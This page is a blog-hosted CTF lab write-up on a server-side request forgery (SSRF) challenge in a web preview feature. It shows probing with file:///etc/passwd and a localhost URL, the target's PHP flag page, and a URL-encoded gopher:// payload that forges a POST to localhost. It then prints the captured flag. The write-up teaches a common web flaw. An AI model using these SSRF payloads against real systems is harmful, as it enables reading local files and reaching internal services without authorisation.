<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Web 0x12(Lab - Web Preview Card)
  #


  tags: NTUSTWS CTF Web
  #

Challenge: http://h4ck3r.quest:8500/

  Background
  #

Web Hacking | 續章【EDU-CTF 2021】
網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」

  Exploit - SSRF
  #

When you see a preview function, then it may have SSRF problem.


Test it
file:///etc/passwd or http://127.0.0.1



Analyze flag.php

:::spoiler source code
<?php
if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;) die("Only for localhost user.");
?>
<form action="/flag.php" method="post">
    Do you want the FLAG? <input type="text" name="givemeflag" value="no">
    <input type="submit">
</form>
<?php
if (isset($_POST[&#39;givemeflag&#39;]) && $_POST[&#39;givemeflag&#39;] === &#39;yes&#39;)
    echo "FLAG:", getenv(&#39;FLAG&#39;);
:::
If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Web 0x12(Lab - Web Preview Card)"><meta property="og:description" content='Simple Web 0x12(Lab - Web Preview Card) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8500/
Background # Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF # When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
<?php if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;) die("Only for localhost user."); ?> <form action="/flag.php" method="post"> Do you want the FLAG? <input type="text" name="givemeflag" value="no"> <input type="submit"> </form> <?php if (isset($_POST[&#39;givemeflag&#39;]) && $_POST[&#39;givemeflag&#39;] === &#39;yes&#39;) echo "FLAG:", getenv(&#39;FLAG&#39;); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTWS"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>Simple Web 0x12(Lab - Web Preview Card) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Web 0x12(Lab - Web Preview Card)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#exploit---ssrf>Exploit - SSRF</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-web-0x12lab---web-preview-card>Simple Web 0x12(Lab - Web Preview Card)
<a class=anchor href=#simple-web-0x12lab---web-preview-card>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8500/>http://h4ck3r.quest:8500/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】</a>
<a href=https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362>網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」</a></p><h2 id=exploit---ssrf>Exploit - SSRF
<a class=anchor href=#exploit---ssrf>#</a></h2><p>When you see a preview function, then it may have SSRF problem.</p><ol><li><p>Test it
<code>file:///etc/passwd</code> or <code>http://127.0.0.1</code>
<img src=https://i.imgur.com/NKbIlDT.png alt></p></li><li><p>Analyze <code>flag.php</code>
<img src=https://i.imgur.com/OGo7biu.png alt>
:::spoiler source code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;) die(&#34;Only for localhost user.&#34;);
?&gt;
&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
    Do you want the FLAG? &lt;input type=&#34;text&#34; name=&#34;givemeflag&#34; value=&#34;no&#34;&gt;
    &lt;input type=&#34;submit&#34;&gt;
&lt;/form&gt;
&lt;?php
if (isset($_POST[&#39;givemeflag&#39;]) &amp;&amp; $_POST[&#39;givemeflag&#39;] === &#39;yes&#39;)
    echo &#34;FLAG:&#34;, getenv(&#39;FLAG&#39;);
</code></pre><p>:::
If you want flag, you need visit <code>/flag.php</code> as localhost and send a form data with parameter <code>givemeflag</code>.</p></li><li><p>Construct package - <font color=FF0000><strong>gopher</strong></font></p><pre tabindex=0><code class=language-! data-lang=!>POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

givemeflag=yes
</code></pre><p>Transferred by <a href=https://www.urlencoder.org/>urlencode</a> with <code>CRLF</code> type.
Payload: <code>gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a</code></p></li><li><p>Then we got flag&mldr;</p></li></ol><p>Flag: <code>FLAG{gopher://http_post}</code></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#exploit---ssrf>Exploit - SSRF</a></li></ul></nav></div></aside></main></body></html>